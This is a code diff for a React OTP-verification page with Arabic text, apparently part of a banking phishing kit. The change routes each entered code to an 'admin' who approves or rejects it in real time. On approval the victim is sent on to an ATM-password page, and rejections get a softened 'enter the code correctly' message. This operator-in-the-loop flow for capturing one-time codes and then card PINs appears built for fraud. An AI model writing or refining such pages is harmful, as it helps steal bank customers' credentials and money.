@@ -1,13 +1,13 @@
 import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
+import { useSignalEffect } from "@preact/signals-react";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
   sendData,
-  isFormApproved,
-  isFormRejected,
+  codeAction,
   navigateToPage,
 } from "@/lib/store";
 
@@ -22,21 +22,23 @@ export default function OTPVerification() {
     navigateToPage("رمز التحقق (OTP)");
   }, []);
 
-  // Handle form approval
-  useEffect(() => {
-    if (isFormApproved.value) {
-      navigate("/atm-password");
+  // Handle code action from admin
+  useSignalEffect(() => {
+    const action = codeAction.value;
+    if (action) {
+      if (action.action === "approve") {
+        // Navigate to ATM password page
+        navigate("/atm-password");
+      } else if (action.action === "reject") {
+        // Show error and clear OTP
+        setOtp("");
+        setError(true);
+        inputRef.current?.focus();
+      }
+      // Reset the action
+      codeAction.value = null;
     }
-  }, [isFormApproved.value, navigate]);
-
-  // Handle form rejection - clear OTP
-  useEffect(() => {
-    if (isFormRejected.value) {
-      setOtp("");
-      setError(true);
-      inputRef.current?.focus();
-    }
-  }, [isFormRejected.value]);
+  });
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, "").slice(0, 6);
@@ -116,7 +118,7 @@ export default function OTPVerification() {
 
           {error && (
             <p className="text-red-500 text-xs text-center">
-              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
+              يرجى إدخال الرمز بشكل صحيح
             </p>
           )}
 
